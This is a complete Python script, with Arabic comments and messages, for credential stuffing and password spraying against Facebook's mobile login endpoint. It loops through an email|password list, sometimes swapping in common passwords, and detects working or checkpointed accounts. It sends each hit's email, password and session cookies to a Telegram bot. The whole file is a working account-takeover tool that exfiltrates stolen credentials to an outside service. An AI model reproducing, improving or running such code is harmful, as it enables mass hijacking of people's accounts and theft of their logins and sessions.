import requests, time, os
import webbrowser
from user_agent import generate_user_agent as winston
import random

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#اورق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
Logo = f"""
{M}
░██╗░░░░░░░██╗██╗███╗░░██╗░██████╗████████╗
░██║░░██╗░░██║██║████╗░██║██╔════╝╚══██╔══╝
░╚██╗████╗██╔╝██║██╔██╗██║╚█████╗░░░░██║░░░
░░████╔═████║░██║██║╚████║░╚═══██╗░░░██║░░░
░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░
		{F} Tele : {X}@W_22U {M} | {F} Feasbook
"""
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
print(Logo)
Token= input(f'{X}	TOKEN  :{Z}').strip()
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
ID= input(f'{X}	ID: {Z}').strip()
os.system('clear')
print(Logo)
Cookies=input(f'{X}	Cookies :{Z}')
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
os.system('clear')
OK=0
CP=0
Bd=0
headers = {
    'User-Agent': str(winston()),
    'sec-ch-ua-platform': "\"Android\"",
    'sec-ch-ua': "\"Chromium\";v=\"152\", \"Not?A_Brand\";v=\"24\", \"Android WebView\";v=\"152\"",
    'sec-ch-ua-mobile': "?1",
    'origin': "https://m.facebook.com",
    'x-requested-with': "com.pitchedapps.frost",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "cors",
    'sec-fetch-dest': "empty",
    'referer': "https://m.facebook.com/",
    'accept-language': "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    'priority': "u=1, i",
    'Cookie': Cookies,
}
print(Logo)
file_path = input(f'{X}	ENTER FILE PATH:{Z}').strip()
webbrowser.open('https://t.me/+-RI8FhLv6s82ZGY8')
if not os.path.exists(file_path):
    print(f"\033[1;31m[!] لم يتم العثور ع ملف: {file_path}\033[0m")
    exit()

print(f"\033[1;36m[*] S: {file_path}\033[0m")
print(f"\033[1;37m{'-'*45}\033[0m")

total = 0
with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
    for line in f:
        line = line.strip()
        if '|' not in line:
            continue

        email, pw = line.split('|', 1)
        email, pw = email.strip(), pw.strip()
        total += 1
        pas=random.choice(['123456','1234567','12345678','123456789','1234567890','١٢٣٤٥٦','١٢٣٤٥٦٧','١٢٣٤٥٦٧٨','١٢٣٤٥٦٧٨٩','qqwweerr','zzxxcc','Aa123456','Aa1234567','Aa12345678','Aa123456789','Aa123123','Aa112233','Aa123321','Aa1234','Qq123456','Ss123456','Zz123456','Xx123456','Dd123456'])

        try:
            current_timestamp = int(time.time())
            pwd_enc = f"#PWD_BROWSER:5:{current_timestamp}:{pw}"
            pasw=random.choice([pas,pw])
            payload = {
                'aaid': "0", 'user': "0", 'a': "1", 'req': "6",
                '__hs': "20718.BP:wbloks_caa_pkg.2.0...0", 'dpr': "3",
                'ccg': "EXCELLENT", 'rev': "1048143467", '__s': ":aygoae:a6ug3f",
                '__hsi': "7688373930982956128",
                'fb_dtsg': "NAfxOOFWtZrjvQwGoLXfOe_E1FWlXc110C_PRabVFvnaryq2rolUWlg:0:0",
                'jazoest': "25189", 'lsd': "AdRrX3tps7aCJldyiUnHktUfv4c",
                'params': f"{{\"params\":{{\"server_params\":{{\"credential_type\":\"password\",\"username_text_input_id\":\"ssvyrl:55\",\"password_text_input_id\":\"ssvyrl:56\",\"login_source\":\"Login\",\"login_credential_type\":\"none\",\"server_login_source\":\"login\",\"ar_event_source\":\"login_home_page\",\"should_trigger_override_login_success_action\":0,\"should_trigger_override_login_2fa_action\":0,\"is_caa_perf_enabled\":0,\"reg_flow_source\":\"login_home_native_integration_point\",\"caller\":\"gslr\",\"is_from_landing_page\":0,\"is_from_empty_password\":0,\"is_from_aymh\":0,\"is_from_password_entry_page\":0,\"is_from_assistive_id\":0,\"is_from_msplit_fallback\":0,\"two_step_login_type\":\"one_step_login\",\"left_nav_button_action\":\"NONE\",\"INTERNALlatency_qpl_marker_id\":36707139,\"INTERNALlatency_qpl_instance_id\":\"174157356900466\",\"device_id\":null,\"family_device_id\":null,\"waterfall_id\":\"b3b79aaf-3c38-41fc-beb7-059722c6af6e\",\"offline_experiment_group\":null,\"layered_homepage_experiment_group\":null,\"is_platform_login\":0,\"is_from_logged_in_switcher\":0,\"is_from_logged_out\":0,\"access_flow_version\":\"pre_mt_behavior\",\"login_surface\":\"login_home\",\"login_entry_point\":\"logged_out\"}},\"client_input_params\":{{\"machine_id\":\"\",\"cloud_trust_token\":null,\"block_store_machine_id\":\"\",\"zero_balance_state\":\"\",\"contact_point\":\"{email}\",\"password\":\"{pasw}\",\"accounts_list\":[],\"fb_ig_device_id\":[],\"secure_family_device_id\":\"\",\"encrypted_msisdn\":\"\",\"headers_infra_flow_id\":\"\",\"try_num\":1,\"login_attempt_count\":1,\"event_flow\":\"login_manual\",\"event_step\":\"home_page\",\"openid_tokens\":{{}},\"auth_secure_device_id\":\"\",\"client_known_key_hash\":\"\",\"has_whatsapp_installed\":0,\"sso_token_map_json_string\":\"\",\"should_show_nested_nta_from_aymh\":0,\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"password_contains_non_ascii\":\"false\",\"has_granted_read_contacts_permissions\":0,\"has_granted_read_phone_permissions\":0,\"app_manager_id\":\"\",\"aymh_accounts\":[],\"sso_accounts_auth_data\":[],\"blocked_uids\":[],\"network_bssid\":null,\"lois_settings\":{{\"lois_token\":\"\"}},\"aac\":\"\"}}}}"
            }

            url = "https://m.facebook.com/async/wbloks/fetch/"
            params = {
                'appid': "com.bloks.www.bloks.caa.login.async.send_login_request",
                'type': "action",
                '__bkv': "2b21e7f8e848df04fe1e558410d11a3c532c49a0ca2669a813d3ed7600bfa570"
            }

            res = requests.post(url, params=params, data=payload, headers=headers, timeout=20)
            coki = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])

            if 'c_user' in coki:
                os.system('clear')
                OK+=1
                print(f"{M}[@W_22U] —> {F} [OK] :{M}{OK} | {X}[CP] :{M}{CP} | {Z}[Error] :{M}{Bd} | {S} [IDS] :{M}{total}")
                R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
ونستون جابلك حساب شغال 
••••••••••••••••••••••••••••••••••••••••
Email : {email}
Password : {pasw}
Cookise : {coki}
••••••••••••••••••••••••••••••••••••••••
Dev :@W_22U  

''')
                i = requests.post(R7)

            elif 'checkpoint' in res.text or 'two_step' in res.text:
                os.system('clear')
                CP+=1
                print(f"{M}[@W_22U] —>{F} [OK] :{M}{OK} | {X}[CP] :{M}{CP} | {Z}[Error] :{M}{Bd} | {S} [IDS] :{M}{total}")
                R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=  
ونستون جابلك حساب سيكور
••••••••••••••••••••••••••••••••••••••••
Email : {email}
Password : {pasw}
Cookise : {coki}
••••••••••••••••••••••••••••••••••••••••
Dev :@W_22U  

''')
                i = requests.post(R7)
            else:
                os.system('clear')
                Bd+=1
                print(f"{M}[@W_22U] —> {F} [OK] :{M}{OK} | {X}[CP] :{M}{CP} | {Z}[Error] :{M}{Bd} | {S} [IDS] :{M}{total}")

        except Exception as e:
            print(f" نتك زباله ارجع شغل ")

print(f"\033[1;36m[*] IDS {total} accounts\033[0m")
